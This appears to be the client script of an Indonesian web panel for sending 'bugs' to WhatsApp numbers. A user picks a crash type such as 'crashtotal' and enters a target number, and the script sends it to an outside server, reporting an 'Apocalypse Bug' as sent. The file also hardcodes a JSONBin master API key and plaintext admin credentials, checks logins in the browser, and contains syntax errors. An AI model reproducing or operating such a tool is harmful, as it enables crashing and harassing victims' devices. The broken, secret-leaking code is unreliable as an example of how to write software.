
const BIN_ID = "686c74c18561e97a50336194";
const API_KEY = "$2a$10$MPw.J50xKE.i.HBKKPWYieKzmUQYvvM/4hLOy3cYHSFcVEL8YoO8W";

const newData = [
  {
    "username": "admin",
    "password": "123456",
    "role": "owner"
  }
];


async function getUsers() {
  const res = await fetch(https://api.jsonbin.io/v3/qs/${BIN_ID}, {
   method: "PUT",
     headers = {
  "Content-Type": "application/json",
  "X-Master-Key": API_KEY;
};
body: JSON.stringify(newData)
});
.then(res => res.json())
.then(data => console.log("Updated!", data))
.catch(err => console.error("Error:", err));

  const data = await res.json();
  return data.record;
}

function logout() {
  sessionStorage.removeItem("currentUser");
  location.reload();
}

function saveSession(user) {
  sessionStorage.setItem("currentUser", JSON.stringify(user));
}

function getSession() {
  return JSON.parse(sessionStorage.getItem("currentUser"));
}

window.onload = async () => {
  const user = getSession();
  if (user) showDashboard(user);
};

function showPopup(message) {
  document.getElementById("popup-message").innerHTML = message;
  document.getElementById("popup").style.display = "flex";
}

function closePopup() {
  document.getElementById("popup").style.display = "none";
}

async function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const result = document.getElementById("login-result");
  const users = await getUsers();
  const found = users.find(u => u.username === user && u.password === pass);

  if (found) {
    saveSession(found);
    showDashboard(found);
  } else {
    result.innerText = "❌ Username atau Password salah!";
    result.style.color = "crimson";
  }
}

function showDashboard(user) {
  document.getElementById("login-box").style.display = "none";
  document.getElementById("main-box").style.display = "block";
  document.getElementById("userLabel").innerText = user.username;
}

let selectedBug = "crashtotal";
document.querySelectorAll(".bug-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
    card.classList.add("active");
    selectedBug = card.getAttribute("data-bug");
  });
});

async function sendBug() {
  const input = document.getElementById("target").value.trim();
  const resDiv = document.getElementById("result");
  const btn = document.getElementById("sendBtn");

  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
    resDiv.innerText = "Masukkan nomor WA yang valid!";
    resDiv.style.color = "crimson";
    return;
  }

  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
  btn.disabled = true;
  const originalHTML = btn.innerHTML;
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
  resDiv.innerText = "";

  try {
    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
    const json = await res.json();
    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
  } catch (err) {
    resDiv.innerText = "❌ Gagal fetch: " + err;
    resDiv.style.color = "crimson";
  }

  btn.disabled = false;
  btn.innerHTML = originalHTML;
}
